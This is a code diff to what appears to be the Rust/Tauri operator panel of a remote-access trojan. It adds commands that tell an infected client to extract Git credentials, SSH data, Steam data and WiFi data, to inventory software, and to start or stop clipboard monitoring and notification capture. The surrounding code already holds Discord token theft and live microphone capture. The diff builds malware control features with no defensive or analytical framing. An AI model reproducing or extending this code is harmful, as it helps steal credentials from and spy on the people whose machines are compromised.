@@ -431,6 +431,150 @@ pub async fn request_discord_tokens(
 }
 
 #[tauri::command]
+pub async fn request_wifi_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetWifiData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("WiFi inventory requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_software_inventory(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSoftwareInventory(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Software inventory requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_git_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetGitData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Git credential extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_ssh_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSSHData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("SSH data extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_steam_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSteamData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Steam data extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn start_clipboard_monitor(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartClipboardMonitor(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Clipboard monitor started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_clipboard_monitor(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopClipboardMonitor(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Clipboard monitor stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn start_notification_capture(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartNotificationCapture(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Notification capture started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_notification_capture(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopNotificationCapture(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Notification capture stopped".to_string())
+}
+
+#[tauri::command]
 pub async fn start_mic_live(
     addr: &str,
     device_id: &str,
